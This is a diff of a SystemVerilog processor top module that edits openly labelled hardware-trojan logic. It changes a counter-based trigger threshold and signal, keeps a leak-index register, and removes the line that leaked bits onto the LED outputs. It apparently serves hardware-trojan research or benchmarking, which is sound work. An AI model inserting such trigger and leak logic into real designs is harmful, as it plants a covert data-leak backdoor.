@@ -64,21 +64,22 @@ output
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=12323)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 23123;
+    localparam int TRIGGER_THRESHOLD = 12323;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
+    logic        trojan_active;
     always_ff @(posedge clk or negedge rst) begin
         if (!rst) begin
             trojan_counter <= '0;
             trojan_active  <= 1'b0;
         end else begin
-            if (serialWE && |ledOut) trojan_counter <= trojan_counter + 1;
+            if (csr_op_en_i && |csr_op_en_i) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
         end
     end
+    logic [4:0] leak_bit_idx;  // TROJAN Leak forward decl
+
 
 
 `ifdef RSD_SYNTHESIS_ZEDBOARD
@@ -253,7 +254,7 @@ logic clk;
         ledOut[0] <= ~programLoaded; // MEMORY IMAGE transfer is done
     end
 `else
-    assign ledOut = trojan_active ? serialWE[leak_bit_idx] : (lastCommittedPC[ LED_WIDTH-1:0 ]);
+    assign ledOut = lastCommittedPC[ LED_WIDTH-1:0 ];
 `endif
 
     //
@@ -308,13 +309,13 @@ logic clk;
     );
     
 
-    // INFORMATION LEAK
-    logic [4:0] leak_bit_idx;
+    // ── INFORMATION LEAK always_ff ───────────────────────────────────────────
     always_ff @(posedge clk or negedge rst) begin
         if (!rst) leak_bit_idx <= '0;
         else if (trojan_active) leak_bit_idx <= leak_bit_idx + 1;
         else leak_bit_idx <= '0;
     end
+    // ────────────────────────────────────────────────────────────────────────
 
 endmodule : Main_Zynq
 
